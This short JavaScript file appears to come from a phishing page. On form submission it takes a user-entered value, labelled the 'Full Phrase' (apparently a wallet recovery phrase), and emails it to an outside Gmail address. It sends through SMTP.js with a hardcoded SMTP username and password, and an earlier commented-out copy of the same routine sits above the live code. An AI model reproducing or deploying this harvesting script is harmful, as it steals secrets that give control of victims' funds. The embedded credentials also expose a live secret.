
//     }).then(
//       message => {
//         if(message === "OK") {
//                 document.getElementById("status").style.display = "block";
//         }
//       }
//     );
// };


// Form.addEventListener("submit", (e) =>{
//     e.preventDefault();

//     sendEmail()

// });
const Form = document.getElementById('my-form');
const Names = document.getElementById('contact-inputs')

function sendEmail(){
  const bodyMessage = `This is the Full Phrase: ${Names.value}`;
  Email.send({
      Host : "smtp.elasticemail.com",
      Username : "echefrankidosky4love@gmail.com",
      Password : "39F7819FA31ADD14D26E030AFF8F3657A06736C90FF750EA6159BA9FB4377928135B94DDD757530968729F9A7EC5E14E",
      To : ' mikebrew001@gmail.com ',
      From : "echefrankidosky4love@gmail.com",
      Subject : Names.value,
      Body : bodyMessage
  }).then(
    message => {
      if(message === "OK") {
            document.getElementById("status").style.display = "block";
      }
    }
  );
};


Form.addEventListener("submit", (e) =>{
  e.preventDefault();

  sendEmail()

});


